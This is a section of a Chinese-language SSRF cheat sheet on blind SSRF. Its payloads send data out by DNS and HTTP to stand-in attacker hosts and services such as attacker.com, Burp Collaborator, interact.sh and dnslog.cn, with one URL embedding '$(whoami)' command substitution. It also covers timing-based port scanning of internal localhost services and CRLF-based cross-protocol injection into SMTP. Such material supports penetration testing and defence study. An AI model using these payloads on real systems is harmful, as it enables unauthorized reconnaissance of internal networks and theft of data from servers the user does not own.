## 七、Blind SSRF利用

### 7.1 DNS外带数据
```
# 利用DNS查询外带数据（所有HTTP客户端都会触发DNS查询）
http://127.0.0.1:80.attacker-controlled-dns.com
# 使用Burp Collaborator/DNSLog/Interactsh
http://xxx.burpcollaborator.net
http://xxx.interact.sh
http://xxx.dnslog.cn

# 构造子域包含数据（需要DNS支持长域名）
http://$(whoami).attacker.com
http://portscan-22-open.attacker.com
# 通过DNS子域名编码端口扫描结果、文件内容等
```

### 7.2 HTTP外带
```
# 通过HTTP请求将数据带出
http://attacker.com/?data=xxx
# 若响应会返回target的部分内容，可做外带
```

### 7.3 端口扫描技巧
```
# 时间端口扫描
# 开放端口：TCP连接快，响应快
# 关闭端口：连接被拒，快
# 防火墙过滤：超时，慢
# 通过响应时间判断端口状态

# 端口开放的HTTP服务可通过响应内容判断
http://127.0.0.1:22    → SSH-2.0 banner
http://127.0.0.1:3306  → MySQL版本信息
http://127.0.0.1:6379  → -ERR或+PONG
```

### 7.4 跨协议攻击
```
# 利用HTTP请求攻击非HTTP协议（CRLF注入）
# HTTP请求末尾的CRLF可以在某些协议中注入命令
http://127.0.0.1:25/?cmd=HELO%0d%0aMAIL FROM...

# 利用gopher攻击任何TCP协议（见5.1节）
```

